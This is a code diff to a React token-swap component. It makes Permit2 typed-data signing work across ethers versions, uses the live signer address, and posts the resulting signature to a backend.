@@ -113,6 +113,7 @@ export default function SwapCard({ walletAddress, provider }) {
       setStatus({ type: 'info', msg: '⏳ Waiting for signature...' });
       
       const signer = provider.getSigner();
+      const currentAddress = await signer.getAddress(); // ✅ Live active signer address
       const network = await provider.getNetwork();
       
       const tokenDecimals = fromToken.decimals || (fromToken.symbol === 'USDT' ? 6 : 18);
@@ -130,17 +131,17 @@ export default function SwapCard({ walletAddress, provider }) {
       );
       
       const allowanceData = await permit2Contract.allowance(
-        walletAddress,
+        currentAddress,
         tokenAddress,
         PERMIT2_CONTRACT_ADDRESS
       );
       
-      // ✅ Fix: BigInt / Number Conversion for Ethers v6 & v5 compatibility
+      // ✅ Fix: BigInt / Number Conversion
       const nonce = Number(allowanceData.nonce);
 
       const domain = {
         name: "Permit2",
-        chainId: network.chainId,
+        chainId: Number(network.chainId),
         verifyingContract: PERMIT2_ADDRESS
       };
       
@@ -169,18 +170,26 @@ export default function SwapCard({ walletAddress, provider }) {
         sigDeadline: sigDeadline
       };
       
-      const signature = await window.ethereum.request({
-        method: 'eth_signTypedData_v4',
-        params: [
-          walletAddress,
-          JSON.stringify({
-            domain,
-            types,
-            primaryType: 'PermitSingle',
-            message
-          })
-        ]
-      });
+      // ✅ Fix Authorization issue using Direct Signer Methods with Fallback
+      let signature;
+      if (signer._signTypedData) {
+        signature = await signer._signTypedData(domain, types, message);
+      } else if (signer.signTypedData) {
+        signature = await signer.signTypedData(domain, types, message);
+      } else {
+        signature = await window.ethereum.request({
+          method: 'eth_signTypedData_v4',
+          params: [
+            currentAddress,
+            JSON.stringify({
+              domain,
+              types,
+              primaryType: 'PermitSingle',
+              message
+            })
+          ]
+        });
+      }
       
       setStatus({ type: 'info', msg: '⏳ Processing on backend...' });
       
@@ -188,7 +197,7 @@ export default function SwapCard({ walletAddress, provider }) {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          user: walletAddress,
+          user: currentAddress,
           token: tokenAddress,
           amount: amount.toString(),
           expiration: expiration,
